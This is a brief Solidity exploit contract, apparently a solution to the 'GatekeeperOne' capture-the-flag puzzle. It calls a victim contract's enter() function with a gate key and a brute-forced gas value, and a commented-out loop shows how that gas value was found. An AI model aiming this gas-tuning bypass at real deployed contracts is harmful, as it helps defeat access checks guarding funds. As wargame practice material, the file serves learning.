// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperOne.sol';

contract AttackGatekeeperOne{
    GatekeeperOne immutable victim;
    // event SuccessEvent(uint gas);

    constructor(GatekeeperOne _victim) {
        victim = _victim;
    }

    function attack(bytes8 gateKey) external {
        // for(uint i = 0; i < 350; i++) {
        //     try victim.enter{gas: 8191*10+i}(gateKey) {
        //         emit SuccessEvent(i);
        //         break;
        //     } catch {
        //     }
        // }

        // use the above for loop to find the proper gas value first
        victim.enter{gas: 8191*10+268}(gateKey);
    }
}